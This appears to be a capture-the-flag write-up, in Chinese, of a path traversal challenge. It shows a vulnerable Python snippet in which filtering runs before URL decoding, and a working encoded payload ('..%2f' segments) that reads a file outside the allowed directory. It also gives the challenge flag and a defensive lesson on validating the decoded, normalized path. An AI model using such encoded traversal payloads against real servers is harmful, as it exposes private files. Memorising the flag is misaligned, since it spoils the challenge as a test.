# exporting data on inspector gadget

## 题目简述

文件门户接收 `loc` 查询参数，试图删除 `/` 和 `.html`，再把结果拼到允许目录中。漏洞在于程序先过滤和规范化路径，最后才 URL 解码；编码后的分隔符可以在检查完成后重新变成 `../`，形成路径穿越。

## 解题过程

关键顺序为：

```python
location = sanitize(location.split("=")[1])
path = unquote(os.path.normpath(os.path.join(ROOT, location)))
return send_file(path)
```

`sanitize()` 只处理字面量 `/` 和 `.html`。因此把斜杠写成 `%2f`、点写成 `%2e`：过滤时字符串中没有目标字符，`normpath()` 也看不到真正的目录层级；随后 `unquote()` 才恢复穿越路径。

允许页面 `secrets.html` 列出了敏感文件位于 `/document/insp3ct0r_g4dg3t_456afbc.html`。当前根目录是 `src/web_files`，需向上两级：

```text
/?loc=..%2f..%2fdocument%2finsp3ct0r_g4dg3t_456afbc%2ehtml
```

服务器最终打开的是 `src/web_files/../../document/insp3ct0r_g4dg3t_456afbc.html`，页面内容给出：

```text
greyhats{n0w_w3_haV3_th3ir_files}
```

## 方法总结

输入验证必须建立在规范化后的最终表示上。若过滤、路径规范化和 URL 解码顺序错误，攻击者可让危险字符在检查后才出现。稳妥做法是先完整解码和规范化，再使用 `realpath` 检查目标是否仍位于允许根目录，不能靠删除字符构造“安全路径”。
